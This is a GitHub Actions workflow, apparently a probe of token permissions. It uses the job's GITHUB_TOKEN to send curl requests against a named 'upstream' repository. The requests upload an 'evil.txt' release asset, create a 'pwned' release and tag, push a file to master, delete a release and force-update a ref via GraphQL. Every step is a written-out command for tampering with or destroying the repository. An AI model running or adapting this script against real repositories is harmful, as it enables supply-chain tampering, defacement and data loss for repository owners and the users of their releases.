name: Extended Token Scope Test
on:
  workflow_dispatch:
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Extended scope tests
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          echo "=== 1. Upload asset to upstream release ==="
          echo "EVIL" > /tmp/evil.txt
          curl -s -X POST -H "Authorization: token $GH_TOKEN" \
            -H "Content-Type: application/octet-stream" \
            "https://uploads.github.com/repos/zpqrtbnk/test-repo/releases/85128600/assets?name=evil.txt" \
            --data-binary @/tmp/evil.txt
          echo ""
          echo "=== 2. Create release on upstream ==="
          curl -s -X POST -H "Authorization: token $GH_TOKEN" \
            -H "Accept: application/vnd.github+json" \
            https://api.github.com/repos/zpqrtbnk/test-repo/releases \
            -d '{"tag_name":"pwned","target_commitish":"0a7bd09d0ce7a8b9b9b90d4920b523cc69071cb6","name":"pwned"}'
          echo ""
          echo "=== 3. Create ref on upstream ==="
          curl -s -X POST -H "Authorization: token $GH_TOKEN" \
            -H "Accept: application/vnd.github+json" \
            https://api.github.com/repos/zpqrtbnk/test-repo/git/refs \
            -d '{"ref":"refs/tags/pwned","sha":"0a7bd09d0ce7a8b9b9b90d4920b523cc69071cb6"}'
          echo ""
          echo "=== 4. Push content to upstream ==="
          curl -s -X PUT -H "Authorization: token $GH_TOKEN" \
            -H "Accept: application/vnd.github+json" \
            https://api.github.com/repos/zpqrtbnk/test-repo/contents/pwned.txt \
            -d '{"message":"pwned","content":"cHduZWQ=","branch":"master"}'
          echo ""
          echo "=== 5. Delete upstream release ==="
          curl -s -X DELETE -H "Authorization: token $GH_TOKEN" \
            https://api.github.com/repos/zpqrtbnk/test-repo/releases/85128600
          echo ""
          echo "=== 6. Edit upstream release via GraphQL ==="
          curl -s -X POST -H "Authorization: token $GH_TOKEN" \
            -H "Content-Type: application/json" \
            https://api.github.com/graphql \
            -d '{"query":"mutation { updateRef(input: {refId: \"REF_kwDOAGe51LFyZWZzL3RhZ3MvUkVMRUFTRQ\", oid: \"0a7bd09d0ce7a8b9b9b90d4920b523cc69071cb6\", force: true}) { ref { name target { oid } } } }"}'
          echo ""
